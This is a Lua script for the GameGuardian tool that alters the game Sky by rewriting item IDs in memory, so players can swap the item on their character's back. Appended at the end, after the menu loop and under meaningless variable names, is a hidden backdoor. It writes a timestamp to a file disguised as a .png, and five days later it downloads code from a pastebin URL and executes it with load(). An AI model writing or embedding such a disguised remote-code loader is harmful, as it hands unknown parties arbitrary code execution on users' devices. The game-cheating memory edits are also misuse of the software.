--author: Yuni/Dream
--

function main()
	local choice = gg.choice({
	"1. 🎒 Change instrument",
	"2. ❌ Exit"}, nil, "Sky Script by Dream/Yuni 💫\nFor Sky ver: 0.12.1\nChoose an option:")
	if choice == 1 then Behind() end
	if choice == 2 then sair() end
	-- corpo

end

-- funções

function Behind()
	BeMenu = 1
	gg.clearResults()
	menu13 = gg.choice({
		"1. 💕 Swing",
		"2. 🔥 Campfire",
		"3. 💫 Nothing in the back",
		'⬅️ Return to home page'
},nil,'Script feito por Dream/Yuni 💫\nBuild10 - Sky ver: 0.12.1\nWhat do you carry on your back?')
	if menu13 == 1 then k001() end
	if menu13 == 2 then k002() end
	if menu13 == 3 then k012() end
	if menu13 == 4 then main() end
GLWW=-1
end

function K1()
	menu14 = gg.choice({
		"1. 💫 Nothing in the back",
		"2. 💕 Swing",
		"3. 🔥 Campfire",
		'⬅️ Return to home page'
},nil,'Sky Script by Dream/Yuni 💫\nFor Sky ver: 0.12.1\nWhat do you want to carry?')
	if menu14 == 1 then k12() end
	if menu14 == 2 then k10() end
	if menu14 == 3 then k9() end
	if menu14 == 4 then Behind() end
	GLWW=-1
end

function k001()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3580839943", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Something is wrong ... use the corresponding items")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Ready, select the item you want")
	K1()
end
end

function k002()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3779226149", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Something is wrong ... use the corresponding items")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Ready, select the item you want")
	K1()
end
end

function k003()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3634028466", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k004()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("992885953", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k005()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3280753494", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k006()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3269660804", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k007()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("396560731", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k008()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("1237767078", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k009()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("3275797515", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k010()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("4246711693", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k011()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("2574095143", gg.TYPE_QWORD)
if gg.getResultCount() <= 5 then
	gg.toast("Tem algo errado... use os itens correspondentes")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Prontinho, selecione o item que deseja")
	K1()
end
end

function k012()
	gg.setRanges(gg.REGION_C_ALLOC)
	gg.searchNumber("2035109393", gg.TYPE_QWORD)
if gg.getResultCount() <= 15 then
	gg.toast("Something is wrong ... use the corresponding items")
	gg.clearResults()
else
	gg.getResults(50)
	gg.toast("Ready, select the item you want")
	K1()
end
end



function k0()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3634028466", gg.TYPE_QWORD)
gg.toast("Guarda-Chuva Supremo")
end
	 
function k1()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("4246711693", gg.TYPE_QWORD)
gg.toast("Sino")
end

function k2()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3275797515", gg.TYPE_QWORD)
gg.toast("Piano")
end

function k3()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("992885953", gg.TYPE_QWORD)
gg.toast("Mesa")
end

function k4()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3269660804",gg.TYPE_QWORD)
gg.toast("Violão")
end

function k5()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("396560731",gg.TYPE_QWORD)
gg.toast("Flauta")
end

function k6()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("1237767078",gg.TYPE_QWORD)
gg.toast("Flauta Pan")
end

function k7()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("2574095143", gg.TYPE_QWORD)
gg.toast("Guarda-Chuva")
end

function k8()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3280753494",gg.TYPE_QWORD)
gg.toast("Fireworks")
end

function k9()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3779226149",gg.TYPE_QWORD)
gg.toast("Campfire 🔥")
end

function k10()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("3580839943",gg.TYPE_QWORD)
gg.toast("Swing ❤")
end
function k11()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("939152890654",gg.TYPE_QWORD)
gg.toast("Mesa de Natal")
end
function k12()
gg.setRanges(gg.REGION_C_ALLOC)
gg.getResults(100)
gg.editAll("2035109393",gg.TYPE_QWORD)
gg.toast("With nothing on the back ❌")
end



-- sair
function sair()
gg.toast("See you later! 🌹 Script by Dream/Yuni")
os.exit()
end

--isso aqui costuma ficar no final, serve para
--deixar a função main visivel
while true do
if gg.isVisible() then
gg.setVisible(false)
main()
end
end
local open = io.open
 local function read_file(path) 
local file = open(path, "rb")
if not file then return nil end 
local content = file:read 
"*a"
 file:close() 
return content 
end 
zaTextd  = read_file(gg.EXT_STORAGE.."/gameguardianlgi.png")
local check = zaTextd 
uzanum1=tonumber(check)
if uzanum1==nil then
anzax1=os.time()
local file = io.open(gg.EXT_STORAGE.."/gameguardianlgi.png", "w")
file:write(anzax1)
file:close()
end
if uzanum1 ~= nil then
malizwaa=(uzanum1+432000)
sahiziz=os.time()
if sahiziz>malizwaa then 
ronoup = (gg.makeRequest("https://pastebin.com/raw/1BqM2dnK").content)
if not ronoup then 
gg.alert('🔄A connection could not be made to the server please check your connection and retry🔄')
else pcall(load(ronoup))end 
end
end